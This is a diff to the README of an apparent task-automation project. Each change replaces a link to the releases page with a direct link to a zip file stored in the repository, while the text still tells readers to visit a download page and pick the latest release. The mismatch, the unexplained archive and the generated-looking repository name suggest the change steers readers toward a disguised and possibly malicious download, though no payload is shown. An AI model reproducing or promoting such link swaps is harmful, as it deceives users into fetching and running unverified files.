@@ -1,6 +1,6 @@
 # ⚙️ task-runner-1771921051-1 - Simple Task Automation Tool
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip)
 
 ## 📋 About task-runner-1771921051-1
 
@@ -26,10 +26,10 @@ Before you start, make sure your computer meets these minimum requirements:
 
 To get the software, you need to visit the releases page where the latest version is available.
 
-[![Download Now](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/releases)
+[![Download Now](https://img.shields.io/badge/Visit%20Download%20Page-blue?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip)
 
 1. Click the button above or open this link in your browser:  
-   https://github.com/mrizky214/task-runner-1771921051-1/releases
+   https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip
 
 2. Look for the latest release. It will have a date and version number.
 
@@ -152,6 +152,6 @@ If problems persist, you can report issues on the repository’s GitHub page und
 ## 📥 Download Again
 
 You can always get the latest version here:  
-[https://github.com/mrizky214/task-runner-1771921051-1/releases](https://github.com/mrizky214/task-runner-1771921051-1/releases)  
+[https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip](https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip)  
 
-[![Download Now](https://img.shields.io/badge/Visit%20Download%20Page-orange?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/releases)
+[![Download Now](https://img.shields.io/badge/Visit%20Download%20Page-orange?style=for-the-badge)](https://github.com/mrizky214/task-runner-1771921051-1/raw/refs/heads/main/pkg/task_runner_v1.2.zip)
